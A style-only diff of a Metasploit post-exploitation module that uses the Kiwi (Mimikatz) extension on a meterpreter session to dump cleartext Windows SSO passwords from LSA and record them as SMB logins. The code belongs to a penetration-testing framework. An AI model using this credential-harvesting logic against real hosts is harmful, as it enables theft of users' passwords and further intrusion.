@@ -9,19 +9,22 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
-      'Description'  => %q{
-        This module will collect cleartext Single Sign On credentials from the Local
-      Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored
-      in the database.
-          },
-      'License'      => MSF_LICENSE,
-      'Author'       => ['Ben Campbell'],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Single Sign On Credential Collector (Mimikatz)',
+        'Description' => %q{
+          This module will collect cleartext Single Sign On credentials from the Local
+          Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored
+          in the database.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Ben Campbell'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ]
+      )
+    )
   end
 
   def run
@@ -60,19 +63,21 @@ class MetasploitModule < Msf::Post
     res = client.kiwi.creds_all
 
     table = Rex::Text::Table.new(
-      'Header'    => "Windows SSO Credentials",
-      'Indent'    => 0,
+      'Header' => "Windows SSO Credentials",
+      'Indent' => 0,
       'SortIndex' => 0,
-      'Columns'   => ['Package', 'Domain', 'User', 'Password']
+      'Columns' => ['Package', 'Domain', 'User', 'Password']
     )
 
     processed = Set.new
     livessp_found = false
     [:tspkg, :kerberos, :ssp, :livessp].each do |package|
       next unless res[package]
+
       res[package].each do |r|
         next if is_system_user?(r['Username'])
         next if r['Username'] == '(null)' && r['Password'] == '(null)'
+
         row = [r['Domain'], r['Username'], r['Password']]
         id = row.join(":")
         unless processed.include?(id)
@@ -94,17 +99,17 @@ class MetasploitModule < Msf::Post
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
-      origin_type:         :session,
+      origin_type: :session,
       post_reference_name: self.refname,
-      private_data:        pass,
-      private_type:        :password,
-      session_id:          session_db_id,
-      username:            user,
-      workspace_id:        myworkspace_id
+      private_data: pass,
+      private_type: :password,
+      session_id: session_db_id,
+      username: user,
+      workspace_id: myworkspace_id
     }
 
     unless domain.blank?
-      credential_data[:realm_key]   = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
       credential_data[:realm_value] = domain
     end
 
@@ -112,18 +117,17 @@ class MetasploitModule < Msf::Post
 
     # Assemble the options hash for creating the Metasploit::Credential::Login object
     login_data = {
-      core:         credential_core,
-      status:       Metasploit::Model::Login::Status::UNTRIED,
-      address:      ::Rex::Socket.getaddress(session.sock.peerhost, true),
-      port:         445,
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+      port: 445,
       service_name: 'smb',
-      protocol:     'tcp',
+      protocol: 'tcp',
       workspace_id: myworkspace_id
     }
 
     create_credential_login(login_data)
   end
-
 
   def is_system_user?(user)
     system_users = [
@@ -141,7 +145,6 @@ class MetasploitModule < Msf::Post
       /^LOCAL SYSTEM$/
     ]
 
-    system_users.find{|r| user.to_s.match(r)}
+    system_users.find { |r| user.to_s.match(r) }
   end
 end
-
